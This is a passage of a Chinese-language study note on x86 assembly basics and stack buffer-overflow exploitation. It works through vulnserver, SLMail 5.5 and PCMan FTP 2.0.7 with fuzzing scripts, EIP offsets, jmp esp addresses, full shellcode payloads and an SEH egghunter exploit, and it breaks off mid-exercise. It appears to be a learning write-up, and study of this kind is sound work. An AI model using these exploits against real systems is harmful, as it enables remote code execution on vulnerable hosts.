+mov RAX, 5
+</code></pre>
+<p>分号<code>;</code>后面代表注释</p>
+<h4 id="_21">常见指令</h4>
+<pre><code>MOV - 将源操作数移动/存储到目标操作数  
+LEA - Load Effective Address 加载有效地址，与MOV功能相同，常用来计算地址  
+POSH - 入栈
+POP - 出栈
+
+INC - 加1
+DEC - 减1
+ADD - 相加，add RAX, RBX 可以看成 RAX += RBX
+SUB - 相减，sub RAX, RBX 可以看成 RAX -= RBX
+MUL/IMUL - 相乘，MUL是无符号结果，IMUL是有符号结果
+DIV/IDIV - 相除，无符号和有符号
+
+AL - eax的低8位
+
+TEST - 按位进行AND操作，根据运算结果设置符号标志位、零标志位和奇偶标志位
+
+CMP - 比较，实际上是减法SUB，不同的是SUB会改变目标值，而CMP不会，CMP改变的是标志位。如CMP RAX, RCX  则是RAX=RAX-RCX，对标志位ZF、SF、CF/OF产生影响
+
+RET - 快速返回
+NOP - 填充符
+
+JB - 无符号计算，根据标志位跳转
+JL - 有符号计算，小于跳转。标志位跳转，SF&lt;&gt;OF跳转
+JLE - 小于等于跳转。看标志位时，ZF=1 或 SF&lt;&gt;OF时 跳转
+JE - 等于跳转，ZF为1跳转
+
+TEST - 在两个操作数的对应位之间进行 AND 操作，并根据运算结果设置符号标志位、零标志位和奇偶标志位。
+</code></pre>
+<pre><code>movsxd - 带符号数的扩展。往往是为了从低位往高位扩展时需要，16位扩展到32位
+</code></pre>
+<pre><code>JCC - 是一组指令，根据标志位ZF判断是否跳转，包含JNE、JLE、JNZ等。是用来比较大小的，但是内部逻辑是SUB，然后根据标志位跳转，详细见下图
+
+下面是有符号数的操作，即包含负数比较
+JNE - 目标不等于源时跳转。判断是否ZF是否等于1，ZF为1则继续，为0则跳转
+JLE - 目标小于等于源时跳转
+JGE - 目标大于等于源时跳转
+
+下面是无符号数的操作，即不包含负数比较
+JBE - 小于等于跳转，CF=1或ZF=1跳转
+JAE - 大于等于跳转，
+
+
+</code></pre>
+<p><img alt="" src="../../images/20230922131052.png" /></p>
+<pre><code>CALL - 函数调用，相当于PUSH后JMP
+RET - 函数返回， 相当于POP后JMP
+</code></pre>
+<pre><code>JMP - 跳转指令
+JMP的指令的值以EB开头，EB后面代表跳转的位置，修改EB后面的值为00可以让JMP不跳转而继续执行下一条指令
+</code></pre>
+<pre><code>cdqe - 扩展eax到rax，从32位扩展到64位
+
+
+</code></pre>
+<h4 id="_22">指令中的指针</h4>
+<p>方括号<code>[]</code>中的数据代表的是一个地址，使用<code>LEA</code>来对地址进行操作</p>
+<pre><code>lea RAX, [RCX+8]    ;这是计算地址的
+mov RAX, [RCX+8]    ;这是计算值的
+</code></pre>
+<h3 id="_23">标志位</h3>
+<pre><code>ZF - Zero Flag 在操作结果为零时设置为1。如果操作的结果不为零，则不设置
+CF - Carry Flag 无符号数值，产生借位和进位时，设置为1
+OF - Overflow Flag 有符号数值，产生借位和错位时，设置为1
+SF - Sign Flag 操作结果为负数时，设置为1
+AF? - Adjust/Auxiliary Flag 与CF相同，但用于BCD操作（BCD操作是什么操作）
+PF - Parity Flag 如果后8位中的1是偶数位，则设置为1
+TF - Trap Flag  为1时，允许单步执行程序
+DF - 
+</code></pre>
+<p>参考资料：<a href="https://www.tech-recipes.com/rx/1239/assembly-flags/">https://www.tech-recipes.com/rx/1239/assembly-flags/</a></p>
+<h3 id="_24">汇编中的流程控制</h3>
+<h4 id="case">case</h4>
+<p>通过jmp跳转ecx*4的地址，根据$LN11@f中不同表的值进行分支选择
+<img alt="" src="../../images/20230922152736.png" /></p>
+<p><img alt="" src="../../images/20230922152748.png" /></p>
+<h4 id="for">For循环</h4>
+<p>for循环一定有一个被初始化的值作为索引，通常被赋给ESI，然后比较ESI和另外一个值，并会跳转回去</p>
+<h3 id="_25">汇编中的算术</h3>
+<pre><code>乘法通常用加法、减法和左移来替代
+左移的原理是，当被乘数能被2除尽时，只需要再最右边加上[被除数/2]数量的0即可，被除数是2、4、8、16、32....这些数字时可以使用左移替代乘法
+
+除法也是类似，但是是右移且低位被丢弃
+
+</code></pre>
+<h3 id="_26">汇编中的浮点数</h3>
+<p>x86中的浮点数由FPU来完成处理，ST(0)…ST(7)，有一组可以容纳8*80字节的栈</p>
+<h3 id="_27">缓冲区溢出</h3>
+<p>vscode的选项会防止缓冲区溢出
+/rtc堆栈帧运行时检查
+/GZ启用堆栈检查(/ rtc) </p>
+<p>数组越界读取</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+int main()
+{
+    int a[20];
+    int i;
+    for (i=0; i&lt;20; i++)
+        a[i]=i*2;
+    printf (&quot;a[20]=%d\n&quot;, a[20]);   //当a数组的索引还没到20时，这里就读取了20
+    return 0;
+};
+</code></pre>
+<p>使用cl直接编译，程序运行结果是
+<code>a[20]=1175513387</code>  <code>4610E92B</code></p>
+<p>数组越界写入</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+int main()
+{
+    int a[20];
+    int i;
+    for (i=0; i&lt;30; i++)     //这里循环索引最大是29
+        a[i]=i;             //循环索引赋给了数组的索引，循环索引大于数组索引，导致越界写入。根本不存在a[29]，要如何给a[29]赋值呢？
+    return 0;
+};
+</code></pre>
+<p>一直写入了29个值到栈中，但是程序会在尝试往数组写入a[21]时产生异常
+<img alt="" src="../../images/20230922173434.png" /></p>
+<h4 id="_28">越界写入利用</h4>
+<p>影响：越界写入可造成RCE</p>
+<p>一个基础的越界写入缓存溢出利用步骤</p>
+<pre><code>1. 找到触发缓存溢出的点，也就是找到可对ESP操作的输入点
+2. 找到EIP的偏移位置以便修改EIP
+3. 找到可重定向代码执行流的指令的地址(jmp esp、ret esp等)
+4. 将EIP的值替换为重定向代码执行流语句的地址
+5. 找到程序的坏字符
+6. 构造没有坏字符的shellcode,在shellcode前用数个nop填充防止重定向指令跳过界
+7. 发送payload
+</code></pre>
+<h5 id="a">练习A</h5>
+<ul>
+<li>找到可控输入点的溢出边界
+第一步需要搞清楚多少字节会造成溢出，溢出的边界在哪。
+这里用一个简单的控制台程序来作为练习。
+<img alt="" src="../../images/Snipaste_2023-10-11_12-11-15.jpg" />
+用脚本自动化测试这个输入点可以接收多大字节的数据</li>
+</ul>
+<pre><code class="language-py">import socket
+import sys
+ip = &quot;192.168.14.139&quot;
+port = 31337
+string = b&quot;\xfc&quot; * 10
+s = socket.socket()
+s.connect((ip, port))
+timeout = 3 
+s.settimeout(timeout)
+while True:
+        try:
+                        print(&quot;Fuzzing with {} bytes&quot;.format(len(string)))
+                        s.send(string + b&quot;\x0a\x0d&quot;)
+                        string += b&quot;\xfc&quot; * 10
+                        s.recv(1024)
+        except:
+                print(&quot;Fuzzer crashed at {} bytes&quot;.format(len(string)))
+                sys.exit(0)
+s.close()
+</code></pre>
+<p>跑到160字节时程序崩溃
+<img alt="" src="../../images/Snipaste_2023-10-11_12-13-58.jpg" /></p>
+<ul>
+<li>找到EIP的偏移量
+EIP/RIP寄存器是指令指针，保存了下一行要执行代码的地址。</li>
+</ul>
+<p>由于是160字节程序产生了崩溃，直接自定义一段300字节的数据发送，通过程序崩溃时EIP的值来找到EIP的偏移量
+此时EIP的值为39654138
+<img alt="" src="../../images/Snipaste_2023-10-11_12-44-12.jpg" /></p>
+<pre><code>└─# msf-pattern_offset -l 300 -q 39654138                                               
+[*] Exact match at offset 146
+</code></pre>
+<p>偏移量是146字节，也就是说输入点的最大输入是146个字节，在此之后是EIP的地址。此时发送146个字节，并在后面跟上4个字节，就可以控制EIP的值。
+由于我在146个字节后发送了4个<code>Z</code>，这里的EIP值是<code>5A5A5A5A</code>
+<img alt="" src="../../images/Snipaste_2023-10-11_12-53-37.jpg" /></p>
+<ul>
+<li>查找坏字符
+为什么要查找坏字符? 
+这是因为每个程序的输入点判断不一样，比如有的输入点只允许输入数字，有的程序不允许输入字符。需要找到这些程序不正常处理的坏字符，用这些坏字符之外的字符来生成shellcode，这样可以避免程序因为异常而终止。</li>
+</ul>
+<p>在EIP之后发送所有字符来测试坏字符
+在0x09后的0x0a变成了0x00，0x0a是一个坏字符。
+<img alt="" src="../../images/Snipaste_2023-10-11_13-10-53.jpg" />
+去掉0x0a后重新发送，循环此步骤以找到所有的坏字符</p>
+<ul>
+<li>重定向执行流
+这是shellcode被执行的关键一步。
+找到程序中存在的<code>jmp esp</code>或者<code>call esp</code>可以让程序跳到esp的位置重新执行，以便让shellcode被执行
+通过匹配特征找到了4个<code>jmp esp</code></li>
+</ul>
+<p><img alt="" src="../../images/Snipaste_2023-10-11_14-09-35.jpg" /></p>
+<p>地址分别是</p>
+<pre><code>f7552677
+85102177
+c3c12177
+f2131f77
+</code></pre>
+<p>将<code>EIP</code>的值替换为<code>f7552677</code>便可以让程序重新执行ESP地址的代码</p>
+<p>接着需要在<code>jmp esp</code>后面插入<code>nop</code>，确保jmp之后会执行到shellcode</p>
+<ul>
+<li>生成shellcode
+要注意的
+<em>shellcode不能有坏字符
+shellcode退出线程,不能退出进程</em>
+使用msf生成shellcode</li>
+</ul>
+<pre><code>generate EXITFUNC=thread -b &quot;\x00\x0a&quot;
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-11_14-30-06.jpg" /></p>
+<p>此时完整payload是
+<code>146字节随机字符 + 0xf7552677 + 8字节nop + shellcode</code></p>
+<p><img alt="" src="../../images/Snipaste_2023-10-11_14-39-08.jpg" /></p>
+<h5 id="b">练习B</h5>
+<p>程序运行后的样子</p>
+<pre><code>C:\&gt;nc 192.168.14.139 9999
+Welcome to Vulnerable Server! Enter HELP for help.
+HELP
+Valid Commands:
+HELP
+STATS [stat_value]
+RTIME [rtime_value]
+LTIME [ltime_value]
+SRUN [srun_value]
+TRUN [trun_value]
+GMON [gmon_value]
+GDOG [gdog_value]
+KSTET [kstet_value]
+GTER [gter_value]
+HTER [hter_value]
+LTER [lter_value]
+KSTAN [lstan_value]
+EXIT
+</code></pre>
+<p>某个命令的某些字符串会导致缓存溢出</p>
+<p>TRUN 命令后跟<code>/.</code>，之后的字符串到一定数量后会触发溢出
+<img alt="" src="../../images/Snipaste_2023-10-12_11-12-11.jpg" /></p>
+<p>GMON也存在相同问题,溢出到EBP,溢出不到EIP
+<img alt="" src="../../images/Snipaste_2023-10-12_11-27-32.jpg" /></p>
+<p>KSTET也存在溢出,可覆盖EIP,覆盖不了栈</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-12_12-48-22.jpg" /></p>
+<p>GTER也存在溢出,可溢出到EIP.但测试之后发现溢出后的可控空间不足
+<img alt="" src="../../images/Snipaste_2023-10-12_12-50-13.jpg" /></p>
+<p>还是用TRUN测试
+测试EIP偏移量</p>
+<p>测试坏字符,没有发现0x00外的坏字符</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-12_13-49-25.jpg" /></p>
+<p>最终的payload是</p>
+<pre><code>eip = &quot;\xaf\x11\x50\x62&quot;
+nop = &quot;\x90&quot; * 20
+
+all = b&quot;TRUN /./Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Caaabb&quot; + eip + nop + buf
+
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-12_14-48-08.jpg" /></p>
+<h5 id="c">练习C</h5>
+<p>程序: slmail 5.5版本缓冲区溢出
+POP3协议连接，PASS命令后输入点存在缓冲区溢出漏洞</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-12_15-48-48.jpg" /></p>
+<p>根据作者payload可得知,在PASS命令后插入2606个坏字符字符可导致溢出,EIP偏移量就在2606,之后的数据会溢出到ESP.</p>
+<p>如图EIP的值被覆盖为AAAA
+<img alt="" src="../../images/Snipaste_2023-10-12_15-52-55.jpg" /></p>
+<p>找到<code>jmp esp</code>地址并将EIP的值溢出为该值，程序正确跳到了这个地方
+<img alt="" src="../../images/Snipaste_2023-10-12_16-17-12.jpg" /></p>
+<p>接着测试坏字符
+经测试,坏字符为<code>\x00\x0a\x0b\x0d</code>，排除坏字符生成shellcode，发送</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-12_17-22-49.jpg" /></p>
+<h5 id="d">练习D</h5>
+<p>软件：PCMAN 2.0.7版本 21端口存在缓冲区溢出漏洞</p>
+<p>接着测试</p>
+<p>往21端口发送数据可以看到被服务器接收且回显在日志栏</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-13_12-48-55.jpg" /></p>
+<p>boofuzz跑一下，程序在此处crash了</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-13_12-53-51.jpg" /></p>
+<p>boofuzz脚本发了10000字节数据产生了crash，使用自定义数据测试一下溢出点</p>
+<p>这次发送了5000字节也crash
+<img alt="" src="../../images/Snipaste_2023-10-13_12-59-15.jpg" /></p>
+<pre><code>└─# msf-pattern_offset -q 43396F43                                                      
+[*] Exact match at offset 2007
+
+</code></pre>
+<p>EIP偏移量2007</p>
+<p>坏字符<code>\x00\x0a\x0d</code></p>
+<p>完整payload</p>
+<pre><code>eip = &quot;\x01\x90\xd9\x73&quot;
+nop = &quot;\x90&quot; * 16
+
+buf =  b&quot;&quot;
+buf += b&quot;\xdb\xd7\xd9\x74\x24\xf4\xb8\x88\x11\x6c\xc8\x5a\x2b&quot;
+buf += b&quot;\xc9\xb1\x32\x31\x42\x17\x03\x42\x17\x83\x4a\x15\x8e&quot;
+buf += b&quot;\x3d\xb6\xfe\xcc\xbe\x46\xff\xb0\x37\xa3\xce\xf0\x2c&quot;
+buf += b&quot;\xa0\x61\xc1\x27\xe4\x8d\xaa\x6a\x1c\x05\xde\xa2\x13&quot;
+buf += b&quot;\xae\x55\x95\x1a\x2f\xc5\xe5\x3d\xb3\x14\x3a\x9d\x8a&quot;
+buf += b&quot;\xd6\x4f\xdc\xcb\x0b\xbd\x8c\x84\x40\x10\x20\xa0\x1d&quot;
+buf += b&quot;\xa9\xcb\xfa\xb0\xa9\x28\x4a\xb2\x98\xff\xc0\xed\x3a&quot;
+buf += b&quot;\xfe\x05\x86\x72\x18\x49\xa3\xcd\x93\xb9\x5f\xcc\x75&quot;
+buf += b&quot;\xf0\xa0\x63\xb8\x3c\x53\x7d\xfd\xfb\x8c\x08\xf7\xff&quot;
+buf += b&quot;\x31\x0b\xcc\x82\xed\x9e\xd6\x25\x65\x38\x32\xd7\xaa&quot;
+buf += b&quot;\xdf\xb1\xdb\x07\xab\x9d\xff\x96\x78\x96\x04\x12\x7f&quot;
+buf += b&quot;\x78\x8d\x60\xa4\x5c\xd5\x33\xc5\xc5\xb3\x92\xfa\x15&quot;
+buf += b&quot;\x1c\x4a\x5f\x5e\xb1\x9f\xd2\x3d\xdc\x5e\x60\x38\x92&quot;
+buf += b&quot;\x61\x7a\x42\x83\x09\x4b\xc9\x4c\x4d\x54\x18\x29\xb1&quot;
+buf += b&quot;\xb6\x88\x44\x5a\x6f\x59\xe5\x07\x90\xb4\x2a\x3e\x13&quot;
+buf += b&quot;\x3c\xd3\xc5\x0b\x35\xd6\x82\x8b\xa6\xaa\x9b\x79\xc8&quot;
+buf += b&quot;\x19\x9b\xab\xa6\xf2\x17\x31\x46\x6c\xbc\x97\xc3\x16&quot;
+buf += b&quot;\x59\xe8&quot;
+
+all = &quot;\x90&quot; * 2007
+all += eip
+all += nop
+all += buf
+
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-13_14-32-15.jpg" /></p>
+<h5 id="eseh">练习E(SEH)</h5>
+<p>重做vulserver.exe
+https://zflemingg1.gitbook.io/undergrad-tutorials/walkthroughs-osce/vulnserver-gmon-command</p>
+<p>GMON命令可溢出，无法修改EIP，但是可以溢出到SEH
+<img alt="" src="../../images/Snipaste_2023-10-13_17-08-55.jpg" /></p>
+<p>SEH两条偏移量</p>
+<pre><code>└─# msf-pattern_offset -q 6F45346F
+[*] Exact match at offset 3553
+
+┌──(root💀kali)-[~]
+└─# msf-pattern_offset -q 45336f45
+[*] Exact match at offset 3549
+</code></pre>
+<p>可以控制SEH了
+<img alt="" src="../../images/Snipaste_2023-10-13_17-19-47.jpg" /></p>
+<p>与普通找到<code>jmp esp</code>的方式不同的是，SEH溢出利用需要找到一处pop/pop/ret指令组。这是因为SEH在被调用时会在栈上压入数个参数，两次pop指令可以让ESP——栈顶的位置往高位处移动8字节(32位程序中两次pop寄存器，寄存器大小是4字节)。当ESP减小8字节后再使用RET正好可以执行ESP中被控制的SEH成员地址。</p>
+<p>地址为 <code>625010b4</code>
+<img alt="" src="../../images/Snipaste_2023-10-13_17-38-13.jpg" /></p>
+<p>将SEH的地址覆盖为<code>625010b4</code>，程序成功执行到了该处
+为此需要发送的payload格式为
+<code>SEH溢出偏移量 + NSEH + SEH + 填充符</code>
+NSEH是在SEH执行后调用的指令。
+程序产生异常后会先调用SEH地址的指令，此时SEH地址被覆盖为了2个pop 1个ret，这会导致直接执行NSEH地址的指令，NSEH的指令指引自定义短跳指令跳入shellcode区。</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-13_17-45-41.jpg" /></p>
+<p>2次pop后ret返回到了SEH的小缓冲区
+<img alt="" src="../../images/Snipaste_2023-10-13_17-47-49.jpg" /></p>
+<p>虽然可以使用短跳跳入下面的可控区域，但是下面的区域没有足够的空间让入shellcode。</p>
+<p>由于不能往后跳，那就往回跳，前面的空间也是可控的
+<img alt="" src="../../images/Snipaste_2023-10-14_11-00-02.jpg" /></p>
+<p>但是短跳的距离是有限的，无法跳跃整个shellcode。此时可以采用先短跳至egghunter指令，egghunter在前面的更大的缓冲区中查找egg标记，在egg标记后放置shellcode来执行shellcode</p>
+<p>整个payload如下</p>
+<pre><code>
+//egghunter代码
+egghunter=b&quot;&quot;
+egghunter+=b&quot;\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53&quot;
+egghunter+=b&quot;\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c&quot;
+egghunter+=b&quot;\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7&quot;
+egghunter+=b&quot;\xff\xe7&quot;
+
+//执行notepad的shellcode
+buf =  b&quot;&quot;
+buf += b&quot;\xda\xc0\xd9\x74\x24\xf4\xbb\x74\x96\x27\xf3\x5d\x2b&quot;
+buf += b&quot;\xc9\xb1\x32\x31\x5d\x17\x83\xc5\x04\x03\x29\x85\xc5&quot;
+buf += b&quot;\x06\x2d\x41\x8b\xe9\xcd\x92\xec\x60\x28\xa3\x2c\x16&quot;
+buf += b&quot;\x39\x94\x9c\x5c\x6f\x19\x56\x30\x9b\xaa\x1a\x9d\xac&quot;
+buf += b&quot;\x1b\x90\xfb\x83\x9c\x89\x38\x82\x1e\xd0\x6c\x64\x1e&quot;
+buf += b&quot;\x1b\x61\x65\x67\x46\x88\x37\x30\x0c\x3f\xa7\x35\x58&quot;
+buf += b&quot;\xfc\x4c\x05\x4c\x84\xb1\xde\x6f\xa5\x64\x54\x36\x65&quot;
+buf += b&quot;\x87\xb9\x42\x2c\x9f\xde\x6f\xe6\x14\x14\x1b\xf9\xfc&quot;
+buf += b&quot;\x64\xe4\x56\xc1\x48\x17\xa6\x06\x6e\xc8\xdd\x7e\x8c&quot;
+buf += b&quot;\x75\xe6\x45\xee\xa1\x63\x5d\x48\x21\xd3\xb9\x68\xe6&quot;
+buf += b&quot;\x82\x4a\x66\x43\xc0\x14\x6b\x52\x05\x2f\x97\xdf\xa8&quot;
+buf += b&quot;\xff\x11\x9b\x8e\xdb\x7a\x7f\xae\x7a\x27\x2e\xcf\x9c&quot;
+buf += b&quot;\x88\x8f\x75\xd7\x25\xdb\x07\xba\x23\x1a\x95\xc1\x06&quot;
+buf += b&quot;\x1c\xa5\xc9\x36\x75\x94\x42\xd9\x02\x29\x81\x9d\xed&quot;
+buf += b&quot;\xcb\x03\xe8\x85\x55\xc6\x51\xc8\x65\x3d\x95\xf5\xe5&quot;
+buf += b&quot;\xb7\x66\x02\xf5\xb2\x63\x4e\xb1\x2f\x1e\xdf\x54\x4f&quot;
+buf += b&quot;\x8d\xe0\x7c\x21\x5e\x6b\x1a\xcd\xc1\xf7\xca\x48\x7a&quot;
+buf += b&quot;\x9d\x12&quot;
+
+all = b&quot;GMON /.&quot;                 //造成溢出的字符
+all += &quot;A&quot; * 8                   //占位，与有效数据分开
+all += b&quot;PWNDPWND&quot; + buf         //egg标志后面跟shellcode
+all += &quot;\x90&quot; * (3556 - 50 -len(all))    //减去egg标志、shellcode、egghunter代码后的填充
+all += egghunter                //egghunter填充字符，放在这里便于被短跳到
+all += &quot;\x90&quot; * (3556 - len(all))    //剩余的填充字符
+all += &quot;\xeb\xbc\x90\x90&quot;      //nseh，这是一个短跳指令
+all += &quot;\xb4\x10\x50\x62&quot;      //指向pop pop ret指令的地址，便于执行nseh中地址
+all += &quot;\x90&quot; * 1000            //填充符
+
+s.send(all)
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-14_13-53-37.jpg" /></p>
+<h5 id="f">练习F</h5>
+<p>vulserver的HTER命令练习</p>
+<p>栈溢出EIP覆盖，直接使用普通字符可以造成溢出。但是溢出字符被直接写入了内存。
+<img alt="" src="../../images/Snipaste_2023-10-16_14-17-01.jpg" /></p>
+<p>msf生成的字符在这种环境无法使用，所以字符都以16进制写入内存，测试没办法造成溢出。
+使用脚本一个个发送字符，反复测试，最终溢出点在<code>HTER</code>的2041字符后</p>
+<pre><code>import socket
+import sys
+ip = &quot;192.168.14.139&quot;
+port = 9999
+string = &quot;HTER &quot;
+s = socket.socket()
+s.connect((ip, port))
+timeout = 3 
+s.settimeout(timeout)
+while True:
+        try:
+                        print(&quot;Fuzzing with {} bytes&quot;.format(len(string)))
+                        s.send(string + b&quot;\x0a\x0d&quot;)
+                        string += b&quot;A&quot; * 1
+                        s.recv(1024)
+        except:
+                print(&quot;Fuzzer crashed at {} bytes&quot;.format(len(string)))
+                sys.exit(0)
+s.close()
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-16_15-06-22.jpg" />
+用mona插件找到<code>jmp esp</code>的地址。</p>
+<pre><code>[+] Command used:
+!mona jmp -r esp
+
+---------- Mona command started on 2023-10-16 15:15:42 (v2.0, rev 577) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] Querying 2 modules
+    - Querying module essfunc.dll
+    - Querying module vulnserver.exe
+    - Search complete, processing results
+[+] Preparing output file 'jmp.txt'
+    - (Re)setting logfile jmp.txt
+[+] Writing results to jmp.txt
+    - Number of pointers of type 'jmp esp' : 9 
+[+] Results : 
+0x625011af |   0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+0x625011bb |   0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+0x625011c7 |   0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+0x625011d3 |   0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+0x625011df |   0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+0x625011eb |   0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+0x625011f7 |   0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+0x62501203 |   0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+0x62501205 |   0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
+</code></pre>
+<p>后面就是常规的找坏字符、生成shellcode，然后发送payload。完整payload</p>
